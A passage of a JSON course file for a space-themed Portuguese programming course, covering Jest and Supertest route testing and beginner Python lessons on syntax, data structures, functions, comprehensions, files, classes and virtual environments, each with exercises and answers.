        "content": "# 🧪 Testes Automatizados de Rotas com Supertest e Jest\n\nMissão final na Backend Colony! Um engenheiro de software de elite não confia em \"testar na mão\" clicando no Insomnia ou Postman toda vez que faz uma alteração. Construímos **suítes de testes automatizados** que validam a integridade da frota em segundos.\n\n> **💡 Testes de Integração de API**\n> Testes de integração de API disparam requisições HTTP simuladas contra os endpoints do Express e verificam se os códigos de status (`200`, `400`, `404`), cabeçalhos e corpos JSON retornados estão de acordo com o esperado.\n\n---\n\n### 🛠️ A Dupla Campeã: Jest & Supertest\n\n```javascript\nconst request = require('supertest');\nconst app = require('../src/app'); // Importa o app Express (sem app.listen!)\n\ndescribe('🛸 Suíte de Testes da Rota de Naves', () => {\n  it('GET /api/naves deve retornar status 200 e uma lista', async () => {\n    const resposta = await request(app)\n      .get('/api/naves')\n      .set('x-nexus-auth', 'token-valido');\n\n    expect(resposta.status).toBe(200);\n    expect(Array.isArray(resposta.body)).toBe(true);\n  });\n\n  it('POST /api/naves sem nome deve retornar status 400 com mensagem de erro', async () => {\n    const resposta = await request(app)\n      .post('/api/naves')\n      .send({ velocidade: 500 }); // Nome ausente intencionalmente!\n\n    expect(resposta.status).toBe(400);\n    expect(resposta.body.erro).toBeDefined();\n  });\n});\n```\n\n---\n\n### 🧩 A Regra de Ouro da Arquitetura: Separar `app` de `server`\n\nPara os testes funcionarem perfeitamente sem prender a porta de rede:\n- **`app.js`**: Contém a configuração do Express, rotas e middlewares (`module.exports = app`).\n- **`server.js`**: Apenas importa o `app` e chama `app.listen(porta)`.\n\nDessa forma, o Supertest executa a API diretamente na memória através de sockets virtuais, sem precisar ligar servidores reais de rede!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de limpar o banco de testes entre cada execução (`beforeEach` ou `afterEach`). Testes que dependem do resultado do teste anterior tornam-se frágeis e quebram aleatoriamente!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Configure um ambiente dedicado (`NODE_ENV=test`) para que seus testes não modifiquem o banco de dados de desenvolvimento.\n- Teste sempre tanto o \"caminho feliz\" (respostas de sucesso) quanto os cenários de erro (dados inválidos e acessos não autorizados).\n\n> **🛡️ Regra de Ouro:**\n> O pipeline de deploy contínuo (CI/CD) só deve enviar o código para produção após 100% dos testes automatizados passarem com sinal verde.",
        "codeExample": "// Exemplo de teste de rota autenticada\nit('deve rejeitar acesso com 401 se nenhum token for enviado', async () => {\n  const res = await request(app).get('/api/privada');\n  expect(res.status).toBe(401);\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que é uma boa prática separar o arquivo de configuração do Express (app.js) do arquivo que inicializa a porta de rede (server.js)?",
            "options": [
              "Porque o Node.js não permite mais que um arquivo tenha comandos JavaScript.",
              "Porque permite que bibliotecas de teste como Supertest executem requisições simuladas na memória sem abrir portas de rede reais.",
              "Para permitir que o app rode automaticamente em smartphones.",
              "Para forçar o carregamento de arquivos CSS no backend."
            ],
            "correctIndex": 1,
            "explanation": "Separar o app permite importá-lo no Supertest para testes rápidos em memória sem gerar colisões de portas TCP abertas."
          },
          {
            "type": "code",
            "instruction": "Escreva um teste com Supertest e Jest que dispare um GET na rota \"/status\" do \"app\" e espere que o status retornado seja 200.",
            "initialCode": "it(\"deve responder 200 na rota /status\", async () => {\n  // Escreva a requisição e asserção aqui\n});",
            "expectedKeywords": [
              "await request(app).get(\"/status\")",
              "expect(res.status).toBe(200)"
            ],
            "hint": "Use: const res = await request(app).get(\"/status\"); expect(res.status).toBe(200);",
            "solution": "it(\"deve responder 200 na rota /status\", async () => {\n  const res = await request(app).get(\"/status\");\n  expect(res.status).toBe(200);\n});"
          }
        ]
      }
    ]
  },
  {
    "id": "python",
    "slug": "python",
    "name": "Python",
    "planetName": "AI Planet",
    "description": "A linguagem versátil que comanda a inteligência artificial, automações e análise de dados.",
    "icon": "🐍",
    "color": "#00FF88",
    "language": "python",
    "level": "Iniciante",
    "totalXp": 520,
    "lessons": [
      {
        "id": "py-1",
        "title": "1. A Força da Sintaxe Limpa & Tipos",
        "description": "Descubra a elegância do Python, indentação como bloco de código e variáveis dinâmicas.",
        "duration": 14,
        "xpReward": 60,
        "language": "python",
        "content": "# 🐍 A Força da Sintaxe Limpa & Tipos no AI Planet\n\nBem-vindo ao **AI Planet**, cadete! Aqui você aprenderá a linguagem favorita dos cientistas de dados, engenheiros de inteligência artificial e especialistas em cibersegurança ao redor do globo.\n\n> **💡 A Filosofia do Python (The Zen of Python):**\n> Criado por Guido van Rossum, o Python foi desenhado com um princípio sagrado: **código é lido muito mais vezes do que é escrito**. Sua sintaxe é limpa, direta e quase parece inglês estruturado.\n\n---\n\n### 📏 A Regra Suprema: Indentação Obrigatória\n\nDiferente do JavaScript ou C++ que usam chaves `{ }` para definir blocos, o Python usa **espaços de indentação** (4 espaços por convenção):\n\n```python\nenergia = 85\n\nif energia > 50:\n    print(\"Sistemas operando em potência máxima!\")\nelse:\n    print(\"Modo de economia ativado.\")\n```\n\n---\n\n### 🧬 Variáveis e Tipagem Dinâmica\n\nVocê não precisa declarar tipos explicitamente. O Python infere o tipo automaticamente no momento da atribuição:\n\n```python\nnome_agente = \"Ada Lovelace\"  # str (texto)\nnivel_acesso = 7             # int (inteiro)\nfator_dobra = 3.14           # float (decimal)\nsistema_ativo = True         # bool (booleano - com inicial Maiúscula!)\n```\n\n---\n\n### 💬 Textos Dinâmicos com F-Strings\n\nA maneira mais moderna e rápida de interpolar variáveis em textos no Python é usar **f-strings**:\n\n```python\npontuacao = 450\nprint(f\"O cadete {nome_agente} possui {pontuacao} pontos de XP!\")\n```\n\n> **💡 Dica Pro:**\n> Em Python, booleanos começam com letra maiúscula obrigatória: `True` e `False` (escrever `true` gera um erro `NameError`).\n\n> **⚠️ Armadilha Comum:**\n> Misturar espaços e teclas TAB na indentação causa o temido `TabError` ou `IndentationError`. Configure seu editor para sempre converter tabs em 4 espaços!",
        "codeExample": "# Diagnóstico do Robô Explorador do AI Planet\nnome_robo = \"Curiosity-X\"\nbateria = 92\nsensores_ativos = True\n\nprint(f\"Status do robô {nome_robo}: Bateria em {bateria}%\")\n\nif bateria >= 80 and sensores_ativos:\n    print(\"Pronto para coletar amostras geológicas.\")",
        "exercises": [
          {
            "type": "quiz",
            "question": "Como o interpretador Python identifica onde começa e onde termina um bloco de código (como o corpo de um if, for ou função)?",
            "options": [
              "Através de ponto e vírgula no final de cada instrução.",
              "Através do nível de indentação de espaços à esquerda das linhas de código.",
              "Através de palavras-chave como BEGIN e END.",
              "Através de parênteses curvos envolvendo todo o bloco."
            ],
            "correctIndex": 1,
            "explanation": "No Python, a indentação faz parte da sintaxe obrigatória da linguagem, eliminando a necessidade de chaves e tornando os programas naturalmente legíveis."
          },
          {
            "type": "fillblank",
            "title": "Emitindo o Relatório de Voo",
            "instruction": "Complete o comando de impressão usando uma f-string para exibir o nome da sonda.",
            "codeSnippet": "sonda = \"Voyager-3\"\n{{comando_print}}({{prefixo_fstring}}\"Sonda detectada: {sonda}\")",
            "blanks": [
              {
                "id": "comando_print",
                "placeholder": "comando de saída",
                "expectedValues": [
                  "print"
                ],
                "hint": "Função padrão em Python para exibir saídas no terminal."
              },
              {
                "id": "prefixo_fstring",
                "placeholder": "letra da f-string",
                "expectedValues": [
                  "f",
                  "F"
                ],
                "hint": "Letra única que prefixa a string para ativar a interpolação de variáveis em {chaves}."
              }
            ],
            "explanation": "Perfeito! O comando print(f\"...\") é a forma padrão da indústria moderna para formatar mensagens com elegância."
          },
          {
            "type": "bughunt",
            "title": "Alerta de Indentação na Sonda",
            "scenario": "O script de ignição falhou na inicialização com IndentationError: expected an indented block after if statement.",
            "buggyCode": "temperatura = 120\n\nif temperatura > 100:\nprint(\"Alerta: Superaquecimento detectado!\")\nelse:\n    print(\"Temperatura estável.\")",
            "expectedKeywords": [
              "    print(\"Alerta: Superaquecimento detectado!\")"
            ],
            "forbiddenKeywords": [
              "\nprint(\"Alerta: Superaquecimento detectado!\")"
            ],
            "hint": "Adicione 4 espaços de indentação na linha do primeiro print para colocá-lo dentro do bloco if.",
            "solutionExplanation": "Bug neutralizado! Com os 4 espaços de indentação, o Python compreende que o comando pertence ao bloco if."
          }
        ]
      },
      {
        "id": "py-2",
        "title": "2. Estruturas de Dados & Laços de Repetição",
        "description": "Manipule listas, dicionários e itere sobre coleções de dados no cosmos.",
        "duration": 16,
        "xpReward": 65,
        "language": "python",
        "content": "# 📊 Estruturas de Dados & Laços no AI Planet\n\nPara processar grandes volumes de dados de telemetria ou treinar modelos neurais, você precisa de estruturas de dados eficientes e flexíveis.\n\n---\n\n### 📋 Listas em Python (Mutáveis & Dinâmicas)\n\nListas armazenam sequências ordenadas de itens:\n\n```python\nplanetas = [\"Terra Digital\", \"Neon City\", \"Cyber Core\"]\n\n# Adicionando um novo planeta\nplanetas.append(\"AI Planet\")\n\n# Acessando o primeiro item (índice 0)\nprimeiro = planetas[0]\n```\n\n---\n\n### 📖 Dicionários (Chave e Valor)\n\nDicionários são ideais para modelar entidades ricas com propriedades nomeadas:\n\n```python\ncadete = {\n    \"nome\": \"Kaelen\",\n    \"nivel\": 12,\n    \"especialidade\": \"Engenharia de Dados\"\n}\n\n# Acessando com segurança usando .get()\ncargo = cadete.get(\"especialidade\", \"Geral\")\n```\n\n---\n\n### 🔁 Laço de Repetição `for` Elegante\n\nNo Python, você itera diretamente sobre os elementos da coleção:\n\n```python\nleituras_rad = [12, 45, 89, 23, 105]\n\nfor leitura in leituras_rad:\n    if leitura > 80:\n        print(f\"Radiação crítica detectada: {leitura} mSv\")\n```\n\n> **💡 Dica Pro:**\n> O método `dicionario.get(\"chave\", valor_padrao)` evita que seu programa quebre com erro `KeyError` caso a chave não exista no dicionário.\n\n> **⚠️ Armadilha Comum:**\n> Modificar o tamanho de uma lista (adicionando ou removendo itens) enquanto você está iterando sobre ela em um laço `for` pode causar comportamento imprevisível ou pular elementos.",
        "codeExample": "# Filtrando Módulos com Potência Alta\nmodulos = [\n    {\"nome\": \"Propulsor Alfa\", \"potencia\": 120},\n    {\"nome\": \"Sensor Laser\", \"potencia\": 45},\n    {\"nome\": \"Canhão de Plasma\", \"potencia\": 95}\n]\n\nmodulos_pesados = []\nfor m in modulos:\n    if m[\"potencia\"] >= 90:\n        modulos_pesados.append(m[\"nome\"])\n\nprint(\"Módulos de alta potência:\", modulos_pesados)",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual a principal diferença entre uma lista [ ] e uma tupla ( ) no Python?",
            "options": [
              "Listas só aceitam números, enquanto tuplas só aceitam strings.",
              "Listas são mutáveis (podem ter itens adicionados/removidos), enquanto tuplas são imutáveis após criadas.",
              "Tuplas rodam exclusivamente no servidor e listas rodam no navegador.",
              "Não existe diferença prática entre listas e tuplas em Python."
            ],
            "correctIndex": 1,
            "explanation": "Tuplas são estruturas de dados de tamanho e conteúdo fixos (imutáveis), ideais para coordenadas ou configurações imutáveis que não devem ser alteradas acidentalmente."
          },
          {
            "type": "code",
            "instruction": "Escreva uma função chamada somar_xp que recebe uma lista de pontuacoes e retorna a soma total dos números da lista usando a função nativa sum().",
            "initialCode": "# Escreva a função somar_xp abaixo\n",
            "expectedKeywords": [
              "def somar_xp",
              "pontuacoes",
              "return sum("
            ],
            "hint": "Declare def somar_xp(pontuacoes): e retorne sum(pontuacoes).",
            "solution": "def somar_xp(pontuacoes):\n    return sum(pontuacoes)"
          }
        ]
      },
      {
        "id": "py-3",
        "title": "3. Funções Modulares, *args e **kwargs",
        "description": "Construa rotinas reutilizáveis com parâmetros posicionais variáveis (*args) e nomeados (**kwargs).",
        "duration": 15,
        "xpReward": 65,
        "language": "python",
        "content": "# 🐍 Funções Modulares, *args e **kwargs\n\nBem-vindo ao terceiro setor do AI Planet! Em Python, escrever funções limpas e flexíveis é essencial para construir algoritmos de inteligência artificial e processamento de dados.\n\n> **💡 O que são *args e **kwargs?**\n> São convenções de desempacotamento de parâmetros:\n> - `*args`: Permite receber um número indeterminado de argumentos posicionais dentro de uma **tupla**.\n> - `**kwargs` (*keyword arguments*): Permite receber um número indeterminado de argumentos nomeados dentro de um **dicionário**.\n\n---\n\n### 📦 Desempacotando Parâmetros na Prática\n\n```python\ndef calcular_potencia_total(*propulsores):\n    # propulsores é uma tupla de números!\n    total = sum(propulsores)\n    print(f\"Potência somada de {len(propulsores)} propulsores: {total} GW\")\n    return total\n\ncalcular_potencia_total(100, 250, 400) # 750 GW\n```\n\n---\n\n### 🎛️ Argumentos Nomeados Flexíveis com `**kwargs`\n\n```python\ndef configurar_ia(modelo, **parametros):\n    print(f\"Inicializando modelo: {modelo}\")\n    for chave, valor in parametros.items():\n        print(f\" - {chave}: {valor}\")\n\nconfigurar_ia(\"Nexus-Vision\", temperatura=0.7, max_tokens=2048, gpu=True)\n```\n\n> **⚠️ Armadilha Comum:**\n> A ordem dos parâmetros na definição da função importa! A ordem obrigatória no Python é:\n> `def funcao(posicionais_obrigatorios, *args, valores_padrao=None, **kwargs):`\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Utilize Type Hints nos parâmetros e no retorno para clareza: `def somar(a: int, b: int) -> int:`.\n- Escreva Docstrings descritivas logo abaixo da assinatura da função usando aspas triplas (`\"\"\" ... \"\"\"`).\n\n> **🛡️ Regra de Ouro:**\n> Funções puras que não alteram variáveis globais externas são muito mais fáceis de testar e paralelizar.",
        "codeExample": "def registrar_missao(codigo: str, *tripulantes, status=\"ativo\", **detalhes):\n    return {\n        \"codigo\": codigo,\n        \"tripulantes\": list(tripulantes),\n        \"status\": status,\n        \"metadados\": detalhes\n    }",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Python, qual estrutura de dados nativa armazena internamente os argumentos passados através de *args?",
            "options": [
              "Um dicionário (dict)",
              "Uma tupla (tuple)",
              "Uma lista mutável (list)",
              "Um conjunto (set)"
            ],
            "correctIndex": 1,
            "explanation": "O operador * empacota múltiplos argumentos posicionais em uma tupla imutável acessível dentro da função."
          },
          {
            "type": "code",
            "instruction": "Crie uma função chamada \"somar_todos\" que receba \"*numeros\" e retorne a soma de todos os números utilizando a função nativa sum().",
            "initialCode": "# Defina a função somar_todos aqui\n",
            "expectedKeywords": [
              "def somar_todos(*numeros):",
              "return sum(numeros)"
            ],
            "hint": "Use: def somar_todos(*numeros): return sum(numeros)",
            "solution": "def somar_todos(*numeros):\n    return sum(numeros)"
          }
        ]
      },
      {
        "id": "py-4",
        "title": "4. List & Dict Comprehensions Elegantes",
        "description": "Transforme e filtre coleções de dados com a sintaxe concisa, pythônica e performática de Comprehensions.",
        "duration": 15,
        "xpReward": 65,
        "language": "python",
        "content": "# ⚡ List & Dict Comprehensions Elegantes\n\nSintaxe supersônica no AI Planet! O Python é internacionalmente admirado por sua capacidade de expressar transformações complexas de dados em uma única linha legível através de **Comprehensions**.\n\n> **💡 O que é uma List Comprehension?**\n> É uma forma elegante e pythônica de criar uma nova lista iterando sobre um iterável existente, aplicando transformações e filtros opcionais:\n> `[expressao for item in colecao if condicao]`\n\n---\n\n### 🚀 Comparando Abordagens\n\nAbordagem tradicional com loop clássico:\n```python\n# Imperativo e verboso:\nquadrados = []\nfor x in range(1, 6):\n    quadrados.append(x ** 2)\n```\n\nAbordagem Pythônica com List Comprehension:\n```python\n# Elegante, rápido e direto:\nquadrados = [x ** 2 for x in range(1, 6)]\n# [1, 4, 9, 16, 25]\n```\n\n---\n\n### 🔍 Filtrando com Condicionais e Dict Comprehensions\n\nVocê pode adicionar filtros com `if` no final da expressão:\n\n```python\nniveis_energia = [12, 85, 45, 90, 30, 98]\nreatores_criticos = [n for n in niveis_energia if n > 80]\n# [85, 90, 98]\n\n# Criando Dicionários (Dict Comprehension):\nplanetas = [\"Terra\", \"Marte\", \"Jupiter\"]\ntamanhos = {p: len(p) for p in planetas}\n# {'Terra': 5, 'Marte': 5, 'Jupiter': 7}\n```\n\n> **⚠️ Armadilha Comum:**\n> Criar comprehensions aninhadas com 3 ou 4 laços na mesma linha. Se o código ficar difícil de ler em 3 segundos, divida-o em um laço tradicional com comentários!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- List comprehensions são executadas em velocidade de código C nativo no interpretador CPython, sendo mais rápidas que loops com `.append()`.\n- Se a coleção for gigantesca (milhões de itens), utilize parênteses `(x for x in ...)` para criar um **Generator** que processa sob demanda economizando memória.\n\n> **🛡️ Regra de Ouro:**\n> Legibilidade vem antes de concisão extrema. Mantenha suas comprehensions simples e elegantes.",
        "codeExample": "planetas_setor = [\"Terra Digital\", \"Neon City\", \"Cyber Core\", \"AI Planet\"]\n\n# Seleciona planetas que possuem a palavra \"City\" ou \"Core\" em maiúsculas\ndestinos = [p.upper() for p in planetas_setor if \"City\" in p or \"Core\" in p]",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a saída gerada pela expressão: [n * 10 for n in [1, 2, 3] if n > 1]?",
            "options": [
              "[10, 20, 30]",
              "[20, 30]",
              "[2, 3]",
              "[10]"
            ],
            "correctIndex": 1,
            "explanation": "O filtro if n > 1 descarta o elemento 1, e a transformação n * 10 multiplica os itens restantes (2 e 3), resultando em [20, 30]."
          },
          {
            "type": "code",
            "instruction": "Dada a lista \"valores = [5, 12, 18, 3, 25]\", crie uma list comprehension chamada \"maiores_que_dez\" contendo apenas os números superiores a 10.",
            "initialCode": "valores = [5, 12, 18, 3, 25]\n# Crie a list comprehension aqui\n",
            "expectedKeywords": [
              "maiores_que_dez =",
              "[v for v in valores if v > 10]"
            ],
            "hint": "Use: maiores_que_dez = [v for v in valores if v > 10]",
            "solution": "valores = [5, 12, 18, 3, 25]\nmaiores_que_dez = [v for v in valores if v > 10]"
          }
        ]
      },
      {
        "id": "py-5",
        "title": "5. Manipulação de Arquivos e Tratamento de Exceções",
        "description": "Gerencie leitura e escrita seguras de arquivos com with open() e capture erros com blocos try/except.",
        "duration": 16,
        "xpReward": 65,
        "language": "python",
        "content": "# 📂 Manipulação de Arquivos e Tratamento de Exceções\n\nSegurança de dados e robustez no AI Planet! Softwares confiáveis sabem lidar com arquivos corrompidos, caminhos inexistentes e conexões instáveis sem interromper sua execução.\n\n> **💡 O Gerenciador de Contexto `with`**\n> A instrução `with open(...) as arquivo:` garante o fechamento automático do arquivo assim que o bloco termina, mesmo se ocorrer uma falha ou exceção interna. Nunca mais arquivos travados no sistema operacional!\n\n---\n\n### 📝 Leitura e Escrita Limpa\n\n```python\n# 1. Escrevendo dados (modo 'w' sobrescreve, 'a' anexa)\nwith open(\"diario_bordo.txt\", \"w\", encoding=\"utf-8\") as f:\n    f.write(\"Entrada 01: Trajetória orbital calculada com precisão.\n\")\n    f.write(\"Entrada 02: Sistemas de suporte de vida a 100%.\n\")\n\n# 2. Lendo linha por linha com eficiência\nwith open(\"diario_bordo.txt\", \"r\", encoding=\"utf-8\") as f:\n    for linha in f:\n        print(linha.strip())\n```\n\n---\n\n### 🛡️ Tratamento de Exceções com `try / except / finally`\n\n```python\ntry:\n    with open(\"coordenadas_secretas.txt\", \"r\") as f:\n        conteudo = f.read()\nexcept FileNotFoundError:\n    print(\"Aviso: Arquivo de coordenadas não encontrado. Usando órbita padrão.\")\nexcept PermissionError:\n    print(\"Erro: Permissão negada pelo sistema operacional.\")\nexcept Exception as erro:\n    print(f\"Erro inesperado: {erro}\")\nfinally:\n    print(\"Rotina de verificação concluída.\")\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar `except:` vazio sem especificar o tipo de erro! Isso captura até o sinal de teclado para interromper o programa (`KeyboardInterrupt` - Ctrl+C), impedindo o usuário de fechar o script! Capture sempre exceções específicas.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Especifique sempre `encoding=\"utf-8\"` ao abrir arquivos de texto para evitar problemas com acentuação e caracteres internacionais.\n- Utilize o módulo nativo `pathlib` para manipulação moderna e multiplataforma de diretórios e caminhos.\n\n> **🛡️ Regra de Ouro:**\n> Todo acesso a recursos externos (disco, banco ou rede) deve ser protegido por um bloco `try/except`.",
        "codeExample": "from pathlib import Path\n\ndef salvar_relatorio(nome_arquivo: str, dados: str) -> bool:\n    try:\n        caminho = Path(nome_arquivo)\n        caminho.write_text(dados, encoding=\"utf-8\")\n        return True\n    except OSError as err:\n        print(f\"Falha ao gravar relatório: {err}\")\n        return False",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o principal motivo para utilizar a instrução \"with open(...)\" ao invés de simplesmente chamar \"open(...)\" no Python?",
            "options": [
              "A instrução with duplica a velocidade de leitura do HD.",
              "O bloco with garante que o arquivo seja devidamente fechado e seus recursos liberados automaticamente, mesmo que ocorra uma exceção.",
              "A instrução with impede que outros usuários leiam o arquivo.",
              "Sem o with, o Python não permite escrever arquivos de texto."
            ],
            "correctIndex": 1,
            "explanation": "O gerenciador de contexto (with) implementa o protocolo de fechamento automático garantindo que o arquivo não fique aberto indevidamente na memória."
          },
          {
            "type": "fillblank",
            "title": "Abrindo Arquivo com Gerenciador de Contexto",
            "instruction": "Preencha as palavras-chave para abrir o arquivo em modo leitura com fechamento automático.",
            "codeSnippet": "___ open(\"dados.txt\", \"___\", encoding=\"utf-8\") ___ arquivo:\n    conteudo = arquivo.read()",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "gerenciador de contexto",
                "expectedValues": [
                  "with"
                ],
                "hint": "A instrução do Python usada para contextos gerenciados."
              },
              {
                "id": "blank-2",
                "placeholder": "modo de leitura",
                "expectedValues": [
                  "r"
                ],
                "hint": "A letra que indica modo de leitura (read)."
              },
              {
                "id": "blank-3",
                "placeholder": "alias",
                "expectedValues": [
                  "as"
                ],
                "hint": "Palavra reservada que cria o alias do recurso aberto."
              }
            ],
            "explanation": "A expressão with open(\"dados.txt\", \"r\", encoding=\"utf-8\") as arquivo: é a forma segura e recomendada pela comunidade Python."
          }
        ]
      },
      {
        "id": "py-6",
        "title": "6. Orientação a Objetos: Classes, Construtores e Herança",
        "description": "Modele entidades espaciais com classes, atributos de instância no __init__, métodos e herança de classes.",
        "duration": 17,
        "xpReward": 65,
        "language": "python",
        "content": "# 🤖 Orientação a Objetos: Classes, Construtores e Herança\n\nEstruturas avançadas no AI Planet! A Programação Orientada a Objetos (POO) permite agrupar dados (atributos) e comportamentos (métodos) em entidades coesas que representam o mundo real.\n\n> **💡 O que é uma Classe e o Método `__init__`?**\n> - **Classe**: O blueprint ou molde conceitual da entidade.\n> - **Objeto/Instância**: O exemplar concreto construído a partir do molde.\n> - **`__init__`**: O método construtor especial que é executado automaticamente ao instanciar o objeto para inicializar seus atributos.\n\n---\n\n### 🛸 Construindo a Classe Base\n\n```python\nclass NaveEspacial:\n    def __init__(self, modelo: str, escudo: int = 100):\n        self.modelo = modelo        # Atributo de instância\n        self.escudo = escudo\n        self.velocidade = 0\n\n    def acelerar(self, incremento: int):\n        self.velocidade += incremento\n        print(f\"{self.modelo} acelerou para {self.velocidade} km/s.\")\n\n    def receber_dano(self, impacto: int):\n        self.escudo = max(0, self.escudo - impacto)\n        print(f\"{self.modelo} sofreu dano! Escudo restante: {self.escudo}%\")\n```\n\n---\n\n### 🧬 Herança e o Método `super()`\n\nSubclasses herdam tudo da classe mãe e podem especializar comportamentos:\n\n```python\nclass CacaEstelar(NaveEspacial):\n    def __init__(self, modelo: str, misseis: int = 4):\n        # Chama o construtor da classe base (NaveEspacial)\n        super().__init__(modelo, escudo=75)\n        self.misseis = misseis\n\n    def disparar(self):\n        if self.misseis > 0:\n            self.misseis -= 1\n            print(f\"Míssil disparado! Restam {self.misseis} projéteis.\")\n        else:\n            print(\"Munição esgotada!\")\n```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o primeiro parâmetro `self` na definição dos métodos da classe. O Python usa o `self` para fazer referência explícita à instância atual do objeto!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Implemente os métodos especiais `__repr__` ou `__str__` para que a impressão do objeto (`print(nave)`) exiba uma descrição legível e amigável.\n- Use propriedades com o decorador `@property` caso precise validar o acesso ou alteração de atributos.\n\n> **🛡️ Regra de Ouro:**\n> Prefira composição sobre herança quando a relação entre objetos for de \"tem um\" em vez de \"é um\".",
        "codeExample": "class RoboExplorador:\n    def __init__(self, identificador: str, bateria: int = 100):\n        self.identificador = identificador\n        self.bateria = bateria\n\n    def __str__(self):\n        return f\"Robo[{self.identificador}] - Bateria: {self.bateria}%\"\n\n    def minerar(self, custo: int = 10):\n        if self.bateria >= custo:\n            self.bateria -= custo\n            return \"Cristal extraído!\"\n        return \"Energia insuficiente.\"",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em uma classe Python, qual é o papel do primeiro parâmetro \"self\" declarado nos métodos de instância?",
            "options": [
              "Ele é uma palavra reservada obrigatória para conectar a classe à internet.",
              "Ele representa a própria instância específica do objeto que está executando aquele método.",
              "Ele força a compilação do código para linguagem assembly.",
              "Ele impede que outras classes acessem os métodos."
            ],
            "correctIndex": 1,
            "explanation": "O parâmetro self referencia a instância do objeto que chamou o método, permitindo acessar e modificar seus próprios atributos."
          },
          {
            "type": "code",
            "instruction": "Crie uma classe chamada \"Drone\" com um método construtor \"__init__(self, id_drone)\" que armazene o id no atributo \"self.id_drone\".",
            "initialCode": "# Crie a classe Drone aqui\n",
            "expectedKeywords": [
              "class Drone:",
              "def __init__(self, id_drone):",
              "self.id_drone = id_drone"
            ],
            "hint": "Use: class Drone:\n    def __init__(self, id_drone):\n        self.id_drone = id_drone",
            "solution": "class Drone:\n    def __init__(self, id_drone):\n        self.id_drone = id_drone"
          }
        ]
      },
      {
        "id": "py-7",
        "title": "7. Módulos, Pacotes e Ambientes Virtuais (venv)",
        "description": "Organize projetos em pacotes e isole dependências externas com o módulo padrão venv e pip.",
        "duration": 16,
        "xpReward": 65,
        "language": "python",
        "content": "# 📦 Módulos, Pacotes e Ambientes Virtuais (venv)\n\nEcossistema profissional no AI Planet! Para colaborar em projetos reais de Data Science e Backend, você precisa isolar bibliotecas externas e estruturar códigos em módulos limpos.\n\n> **💡 O que é um Ambiente Virtual (venv)?**\n> Um ambiente virtual é um diretório isolado que possui sua própria instalação de bibliotecas e executável Python. Ele impede que as dependências de um projeto entrem em conflito com as de outro projeto no mesmo computador!\n\n---\n\n### 🛠️ Comandos Sagrados do Terminal\n\n```bash\n# 1. Criar o ambiente virtual na pasta .venv\npython -m venv .venv\n\n# 2. Ativar o ambiente virtual\n# No Linux/Mac:\nsource .venv/bin/activate\n# No Windows PowerShell:\n.venv\\Scripts\\Activate.ps1\n\n# 3. Instalar pacotes de terceiros\npip install requests pandas\n\n# 4. Congelar dependências para a equipe\npip freeze > requirements.txt\n\n# 5. Instalar dependências em outra máquina\npip install -r requirements.txt\n```\n\n---\n\n### 🧩 Estruturando Módulos e Pacotes\n\nUm pacote em Python é simplesmente uma pasta com arquivos `.py`:\n\n```\nmeu_projeto/\n├── .venv/\n├── requirements.txt\n├── main.py\n└── navegacao/\n    ├── __init__.py\n    ├── orbitas.py\n    └── propulsao.py\n```\n\nNo seu arquivo `main.py`:\n```python\nfrom navegacao.orbitas import calcular_trajetoria\nfrom navegacao.propulsao import Reator\n\nresultado = calcular_trajetoria(42)\n```\n\n> **⚠️ Armadilha Comum:**\n> Fazer commit da pasta `.venv` no repositório Git! Essa pasta contém milhares de arquivos pesados específicos da sua máquina operacional. Adicione sempre `.venv/` no seu arquivo `.gitignore`!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use sempre `if __name__ == \"__main__\":` no arquivo principal para impedir que o script execute acidentalmente caso seja importado por outro módulo.\n- Mantenha seu `requirements.txt` sempre atualizado para garantir deploys previsíveis.\n\n> **🛡️ Regra de Ouro:**\n> Nunca instale bibliotecas com `pip install` diretamente no Python global do sistema operacional. Use sempre um ambiente virtual!",
        "codeExample": "# main.py\nfrom math import sqrt\n\ndef calcular_distancia(x1, y1, x2, y2):\n    return sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2)\n\nif __name__ == \"__main__\":\n    d = calcular_distancia(0, 0, 3, 4)\n    print(f\"Distância orbital calculada: {d} anos-luz\")",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o comando oficial do Python para criar um novo ambiente virtual isolado chamado \".venv\"?",
            "options": [
              "python make virtualenv .venv",
              "python -m venv .venv",
              "pip install new-env .venv",
              "python --create-sandbox .venv"
            ],
            "correctIndex": 1,
            "explanation": "O módulo nativo venv é executado através do comando python -m venv <nome_da_pasta>."
          },
          {
            "type": "fillblank",
            "title": "Protegendo o Ponto de Entrada de um Script",
            "instruction": "Complete o idioma padrão do Python que verifica se o script está sendo executado diretamente.",
            "codeSnippet": "if ___ == \"___\":\n    print(\"Executando como script principal\")",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "variável mágica",
                "expectedValues": [
                  "__name__"
                ],
                "hint": "A variável interna do Python que guarda o nome do módulo atual."
              },
              {
                "id": "blank-2",
                "placeholder": "nome do escopo principal",
                "expectedValues": [
                  "__main__"
                ],
                "hint": "O valor especial atribuído ao script que foi executado diretamente pelo terminal."
              }
            ],
            "explanation": "O bloco if __name__ == \"__main__\": garante que o código só execute quando o arquivo for disparado diretamente."
          }
        ]
      },
      {
        "id": "py-8",
        "title": "8. Requisições HTTP e Consumo de APIs com requests",
        "description": "Conecte scripts inteligentes a servidores web consumindo APIs REST com a biblioteca requests e JSON.",
        "duration": 17,
        "xpReward": 70,
        "language": "python",
